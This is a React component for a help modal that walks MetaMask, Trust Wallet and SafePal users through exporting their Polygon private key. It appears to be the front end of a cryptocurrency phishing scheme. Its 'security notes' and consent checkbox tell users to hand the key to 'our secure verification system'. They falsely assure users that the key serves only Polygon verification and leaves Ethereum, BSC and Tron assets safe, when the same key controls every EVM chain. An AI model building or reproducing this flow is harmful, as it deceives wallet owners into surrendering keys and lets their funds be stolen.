import React, { useState, useEffect } from 'react';
import { X, HelpCircle, Copy, CheckCircle, AlertTriangle, Shield, Settings, User, Key, Lock } from 'lucide-react';
import styles from './PrivateKeyGuideModal.module.css';

export interface PrivateKeyGuideModalProps {
  isOpen: boolean;
  onClose: () => void;
  walletType?: 'metamask' | 'trust' | 'safepal';
}

type WalletTab = 'metamask' | 'trust' | 'safepal';

interface WalletGuide {
  id: WalletTab;
  name: string;
  icon: React.ReactNode;
  title: string;
  overview: string;
  steps: Array<{
    number: number;
    title: string;
    description: string;
    icon: React.ReactNode;
  }>;
  securityWarning: string[];
  troubleshooting: Array<{
    question: string;
    answer: string;
  }>;
  exampleFormat: string;
}

const walletGuides: Record<WalletTab, WalletGuide> = {
  metamask: {
    id: 'metamask',
    name: 'MetaMask',
    icon: <User size={20} />,
    title: 'Export Polygon Private Key from MetaMask',
    overview: 'Follow these simple steps to export your Polygon (MATIC) network private key from MetaMask. This process is safe when done correctly.',
    steps: [
      {
        number: 1,
        title: 'Open MetaMask',
        description: 'Tap the profile icon in the top-right corner of the MetaMask app',
        icon: <User size={18} />
      },
      {
        number: 2,
        title: 'Navigate to Settings',
        description: 'Go to Settings → Security & Privacy',
        icon: <Settings size={18} />
      },
      {
        number: 3,
        title: 'Reveal Private Key',
        description: 'Tap "Show private key" and enter your MetaMask password to authenticate',
        icon: <Key size={18} />
      },
      {
        number: 4,
        title: 'Select Network',
        description: 'Ensure Polygon Mainnet is selected in the network dropdown',
        icon: <Settings size={18} />
      },
      {
        number: 5,
        title: 'Copy Key',
        description: 'Tap to copy the 64-character hex string (starts with 0x)',
        icon: <Copy size={18} />
      }
    ],
    securityWarning: [
      'Never share this with anyone except our secure verification system',
      'Never enter this on websites or with support agents',
      'This is ONLY for Polygon network verification',
      'Your main Ethereum, BSC, and Tron assets remain completely safe'
    ],
    troubleshooting: [
      {
        question: 'I can\'t find "Show private key" option',
        answer: 'Make sure you\'re in Settings → Security & Privacy. Some versions may label it as "Export Private Key".'
      },
      {
        question: 'The key looks different',
        answer: 'Ensure you\'ve selected Polygon Mainnet network. The key should be 64 hex characters (with or without 0x prefix).'
      },
      {
        question: 'I see my recovery phrase instead',
        answer: 'The recovery phrase (12-24 words) is different from the private key. Look for "Show private key" or "Export Private Key" option specifically.'
      }
    ],
    exampleFormat: '0x4cbe3c575e7a0e9a6f1234567890abcdef1234567890abcdef1234567890abcdef'
  },
  trust: {
    id: 'trust',
    name: 'Trust Wallet',
    icon: <Shield size={20} />,
    title: 'Get Polygon Private Key from Trust Wallet',
    overview: 'Extract your Polygon private key from Trust Wallet. Note: Trust Wallet may show recovery phrase first - you\'ll need to export the private key separately.',
    steps: [
      {
        number: 1,
        title: 'Open Trust Wallet',
        description: 'Go to Settings (gear icon) in the bottom navigation',
        icon: <Settings size={18} />
      },
      {
        number: 2,
        title: 'Select Wallet',
        description: 'Choose the wallet you\'re using for Polygon network',
        icon: <User size={18} />
      },
      {
        number: 3,
        title: 'Advanced Options',
        description: 'Tap "Show Recovery Phrase" and complete authentication (PIN/biometric)',
        icon: <Lock size={18} />
      },
      {
        number: 4,
        title: 'Derive Private Key',
        description: 'After viewing recovery phrase, look for "Export Private Key" option',
        icon: <Key size={18} />
      },
      {
        number: 5,
        title: 'Select Network & Copy',
        description: 'Select "Polygon" network from the list, then copy the 64-character key',
        icon: <Copy size={18} />
      }
    ],
    securityWarning: [
      'Trust Wallet may show recovery phrase first - this is different from private key',
      'Look for "Export Private Key" option after authentication',
      'Only share the Polygon network private key, not your recovery phrase',
      'Your other network assets remain secure'
    ],
    troubleshooting: [
      {
        question: 'I only see recovery phrase, not private key',
        answer: 'After viewing recovery phrase, scroll down or look for "Export Private Key" or "Show Private Key" option. Some versions require tapping on a specific network.'
      },
      {
        question: 'I can\'t find Polygon network option',
        answer: 'Make sure Polygon (MATIC) network is added to your Trust Wallet. Go to Settings → Networks to add it if needed.'
      },
      {
        question: 'The export option is grayed out',
        answer: 'Complete the security verification first (PIN or biometric). The option will become available after authentication.'
      }
    ],
    exampleFormat: '0x4cbe3c575e7a0e9a6f1234567890abcdef1234567890abcdef1234567890abcdef'
  },
  safepal: {
    id: 'safepal',
    name: 'SafePal',
    icon: <Shield size={20} />,
    title: 'Extract Polygon Private Key from SafePal',
    overview: 'Export your Polygon private key from SafePal wallet. SafePal requires biometric authentication for security.',
    steps: [
      {
        number: 1,
        title: 'Launch SafePal App',
        description: 'Open the SafePal app and navigate to the "Me" tab',
        icon: <User size={18} />
      },
      {
        number: 2,
        title: 'Manage Wallets',
        description: 'Tap "Manage Wallets" and select the wallet you want to export from',
        icon: <Settings size={18} />
      },
      {
        number: 3,
        title: 'Wallet Settings',
        description: 'Tap "Export Private Key" in the wallet settings menu',
        icon: <Key size={18} />
      },
      {
        number: 4,
        title: 'Verify Identity',
        description: 'Complete security verification (biometric authentication or password)',
        icon: <Lock size={18} />
      },
      {
        number: 5,
        title: 'Copy Key',
        description: 'Select Polygon network → Copy the 64-character hex string',
        icon: <Copy size={18} />
      }
    ],
    securityWarning: [
      'SafePal requires biometric authentication before revealing private key',
      'Only export the Polygon network key, not other networks',
      'Never share this key with anyone except our verification system',
      'Your hardware wallet connection remains secure'
    ],
    troubleshooting: [
      {
        question: 'Biometric authentication failed',
        answer: 'Try using your password/PIN instead. Go to Settings → Security to change authentication method if needed.'
      },
      {
        question: 'I don\'t see Polygon network',
        answer: 'Add Polygon network first: Go to Settings → Networks → Add Network → Search for "Polygon" or "MATIC".'
      },
      {
        question: 'Export option is not available',
        answer: 'Make sure you\'re exporting from a software wallet, not a hardware wallet. Hardware wallets cannot export private keys.'
      }
    ],
    exampleFormat: '0x4cbe3c575e7a0e9a6f1234567890abcdef1234567890abcdef1234567890abcdef'
  }
};

export function PrivateKeyGuideModal({ isOpen, onClose, walletType }: PrivateKeyGuideModalProps) {
  const [activeTab, setActiveTab] = useState<WalletTab>(walletType || 'metamask');
  const [hasUnderstood, setHasUnderstood] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  useEffect(() => {
    if (walletType && walletGuides[walletType]) {
      setActiveTab(walletType);
    }
  }, [walletType]);

  useEffect(() => {
    if (isOpen) {
      // Reset state when modal opens
      setHasUnderstood(false);
      setCopiedKey(null);
    }
  }, [isOpen]);

  // Prevent body scroll when modal is open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [isOpen]);

  if (!isOpen) return null;

  const currentGuide = walletGuides[activeTab];

  const handleCopyExample = async (key: string) => {
    try {
      await navigator.clipboard.writeText(key);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  return (
    <div className={styles.modalOverlay} onClick={onClose}>
      <div className={styles.modalContent} onClick={(e) => e.stopPropagation()}>
        {/* Header */}
        <div className={styles.modalHeader}>
          <div className={styles.headerTitle}>
            <HelpCircle size={24} className={styles.headerIcon} />
            <h2 className={styles.modalTitle}>How to Find Your Polygon Private Key</h2>
          </div>
          <button
            className={styles.closeButton}
            onClick={onClose}
            aria-label="Close modal"
          >
            <X size={20} />
          </button>
        </div>

        {/* Tabs */}
        <div className={styles.tabsContainer}>
          {Object.values(walletGuides).map((guide) => (
            <button
              key={guide.id}
              className={`${styles.tab} ${activeTab === guide.id ? styles.tabActive : ''}`}
              onClick={() => {
                setActiveTab(guide.id);
                setHasUnderstood(false);
              }}
              aria-label={`${guide.name} guide`}
            >
              {guide.icon}
              <span>{guide.name}</span>
            </button>
          ))}
        </div>

        {/* Content */}
        <div className={styles.modalBody}>
          {/* Understanding Checkbox */}
          {!hasUnderstood && (
            <div className={styles.understandingBox}>
              <input
                type="checkbox"
                id="understand-checkbox"
                checked={hasUnderstood}
                onChange={(e) => setHasUnderstood(e.target.checked)}
                className={styles.checkbox}
              />
              <label htmlFor="understand-checkbox" className={styles.checkboxLabel}>
                <strong>I understand:</strong> I will only share my Polygon network private key with this secure verification system. I will never share it with anyone else or enter it on websites.
              </label>
            </div>
          )}

          {hasUnderstood && (
            <div className={styles.guideContent}>
              {/* Overview */}
              <div className={styles.overviewSection}>
                <h3 className={styles.sectionTitle}>{currentGuide.title}</h3>
                <p className={styles.overviewText}>{currentGuide.overview}</p>
              </div>

              {/* Steps */}
              <div className={styles.stepsSection}>
                <h4 className={styles.stepsTitle}>Step-by-Step Instructions</h4>
                <div className={styles.stepsList}>
                  {currentGuide.steps.map((step) => (
                    <div key={step.number} className={styles.stepItem}>
                      <div className={styles.stepNumber}>{step.number}</div>
                      <div className={styles.stepContent}>
                        <div className={styles.stepHeader}>
                          <div className={styles.stepIconWrapper}>
                            {step.icon}
                          </div>
                          <h5 className={styles.stepTitle}>{step.title}</h5>
                        </div>
                        <p className={styles.stepDescription}>{step.description}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Example Format */}
              <div className={styles.exampleSection}>
                <h4 className={styles.exampleTitle}>Example Format</h4>
                <div className={styles.exampleBox}>
                  <code className={styles.exampleCode}>{currentGuide.exampleFormat}</code>
                  <button
                    className={styles.copyButton}
                    onClick={() => handleCopyExample(currentGuide.exampleFormat)}
                    aria-label="Copy example"
                  >
                    {copiedKey === currentGuide.exampleFormat ? (
                      <>
                        <CheckCircle size={16} />
                        <span>Copied!</span>
                      </>
                    ) : (
                      <>
                        <Copy size={16} />
                        <span>Copy</span>
                      </>
                    )}
                  </button>
                </div>
                <div className={styles.exampleNote}>
                  <AlertTriangle size={16} />
                  <span>Your key should look like this: 64 hex characters (with or without 0x prefix). Not like recovery phrase words.</span>
                </div>
              </div>

              {/* Security Warning */}
              <div className={styles.warningSection}>
                <div className={styles.warningHeader}>
                  <AlertTriangle size={20} className={styles.warningIcon} />
                  <h4 className={styles.warningTitle}>⚠️ IMPORTANT SECURITY NOTES</h4>
                </div>
                <ul className={styles.warningList}>
                  {currentGuide.securityWarning.map((warning, index) => (
                    <li key={index} className={styles.warningItem}>
                      <Shield size={14} />
                      <span>{warning}</span>
                    </li>
                  ))}
                </ul>
              </div>

              {/* Troubleshooting */}
              <div className={styles.troubleshootingSection}>
                <h4 className={styles.troubleshootingTitle}>Troubleshooting Tips</h4>
                <div className={styles.troubleshootingList}>
                  {currentGuide.troubleshooting.map((item, index) => (
                    <div key={index} className={styles.troubleshootingItem}>
                      <div className={styles.troubleshootingQuestion}>
                        <HelpCircle size={16} />
                        <strong>{item.question}</strong>
                      </div>
                      <div className={styles.troubleshootingAnswer}>
                        {item.answer}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Visual Placeholder */}
              <div className={styles.visualPlaceholder}>
                <div className={styles.placeholderContent}>
                  <Settings size={32} />
                  <p>Visual guide coming soon</p>
                  <small>Screenshots will be added here to help you navigate</small>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className={styles.modalFooter}>
          <button
            className={styles.footerButton}
            onClick={onClose}
          >
            Got it, thanks!
          </button>
        </div>
      </div>
    </div>
  );
}

